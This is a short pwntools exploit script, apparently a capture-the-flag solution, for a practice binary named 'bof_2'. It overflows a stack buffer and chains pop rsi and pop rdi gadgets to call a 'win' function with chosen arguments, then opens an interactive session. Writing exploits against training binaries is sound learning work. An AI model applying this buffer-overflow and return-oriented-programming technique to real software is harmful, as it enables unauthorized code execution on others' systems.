#!/usr/bin/env python3
from pwn import *

exe_path = './bof_2'

HOST = 'example.com/ip'
PORT = 1337

exe = ELF(exe_path, checksec=False)
context.binary = exe

gdbscript = '''
# Break tại main hoặc địa chỉ cụ thể
break *main
# break *win
continue
'''

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    if args.GDB:
        p = process(exe.path)
        return p
    return process(exe.path)

p = start()

# add payload, script here

a1 = a2 = 0xdeadbeefdeadbeef
pop_rsi = 0x00000000004011ee
pop_rdi = 0x00000000004011e5

win_addr = 0x4011f3

payload = 0x48*b'A' + p64(pop_rsi) + p64(a1) + p64(pop_rdi) + p64(a2) + p64(win_addr+5) + (256-0x48-8*5)*b'B'

#input()

p.sendline(payload)

p.interactive()
